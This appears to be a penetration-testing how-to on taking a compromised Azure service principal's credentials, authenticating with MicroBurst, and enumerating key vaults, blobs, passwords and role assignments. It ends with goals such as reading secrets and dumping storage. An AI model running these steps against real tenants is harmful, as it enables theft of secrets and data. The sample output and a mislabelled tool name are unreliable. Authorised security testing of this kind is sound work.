# Enumerate Azure IAM Credential from Compromised Credentials

When conducting a penetration test in Azure, it's critical to enumerate the permissions associated with a compromised Microsoft Entra credential set (client ID, client secret, tenant ID). This helps identify potential privilege escalation paths, accessible services, or sensitive actions the account can perform.

**Tool Recommendation:
[MICROSOFT-AZURE-AD-PERMISSIONS-ENUMERATOR](https://github.com/NetSPI/MicroBurst)**

For Azure, NetSPI’s
[**MicroBurst**](https://github.com/NetSPI/MicroBurst) or
[**AzureHound**](https://github.com/BloodHoundAD/AzureHound) can be used to enumerate effective permissions.

## Example with MicroBurst's Get-AzDomainInfo and Get-AzPasswords

Clone the repo

    git clone https://github.com/NetSPI/MicroBurst.git 

    cd MicroBurst

Set environment variables or provide creds in the command

    Import-Module .\MicroBurst.psm1

Connect with service principal creds

    \$creds = New-Object System.Management.Automation.PSCredential ("\<client-id\>", (ConvertTo-SecureString "\<client-secret\>" -AsPlainText -Force))

    Connect-AzAccount -ServicePrincipal -Credential \$creds -Tenant "\<tenant-id\>"


Enumerate key permissions

    Get-AzDomainInfo
    Invoke-EnumerateAzureSubDomains
    Get-AzPasswords
    Invoke-EnumerateAzureBlobs


------------------------------------------------------------------------

### Output of above steps

- Successfully authenticated to Azure AD
- Enumerating Azure domain info...
- Domain: test.onmicrosoft.com
- Checking for key vault access...
- List of accessible KeyVaults:
- kv-backingstore
- Found permission to list blobs on storage account 'backups001'
- Found AppRole assignment: Contributor on subscription xyz-123-abc

------------------------------------------------------------------------

### Key Actions to Look For

- Get-AzRoleAssignment → View role assignments
- Get-AzKeyVaultSecret → Access secrets (if permissions allow)
- List Storage Containers / Blobs
- List App Registrations → Potential lateral movement
- Enumerate SPNs / Roles / Groups

------------------------------------------------------------------------

### Goal

Determine what the compromised account `can do` such as:

- Read secrets from Key Vault
- Dump storage account contents
- Escalate privileges via Contributor roles
- Enumerate Azure AD users and groups